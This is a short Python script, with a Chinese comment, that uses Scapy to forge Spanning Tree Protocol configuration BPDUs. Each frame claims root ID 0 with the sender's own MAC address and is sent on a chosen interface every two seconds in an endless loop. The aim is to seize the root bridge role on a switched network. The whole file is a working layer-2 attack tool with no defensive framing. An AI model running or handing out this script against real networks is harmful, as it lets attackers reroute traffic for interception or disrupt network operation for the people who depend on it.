#coding: utf-8
#通过修改优先级抢占， 使用STP时需要网卡。

import os
import sys
from scapy.all import *

mac = "00:03:0f:63:d6:6c";
if len(sys.argv) < 2:
    print "missing parameter";
    sys.exit();

mac = get_if_hwaddr(sys.argv[1]);

try:
    pkt = Dot3(src=mac, dst="01:80:c2:00:00:00")/ LLC() / STP();
    pkt[STP].proto = 0;
    pkt[STP].version = 0;
    pkt[STP].bpdutype = 0;
    #pkt[STP].bpduflags = 0x80;  #TCN packet
    #pkt[STP].bpduflags = 0x01;  #Topology Change
    pkt[STP].bpduflags = 0x00;   #configuration
    pkt[STP].rootid = 0;
    pkt[STP].bridgeid = 0;
    pkt[STP].rootmac = mac;
    pkt[STP].bridgemac = mac;
    pkt[STP].pathcost = 0;
    pkt[STP].portid = 0x8002;
    pkt[STP].age = 0;
    pkt[STP].maxage = 20
    pkt[STP].hellotime = 2
    pkt[STP].fwddelay = 15

    pkt.show();
    sendp(pkt, inter=2, count=30, loop=1);
except KeyboardInterrupt:
    pass

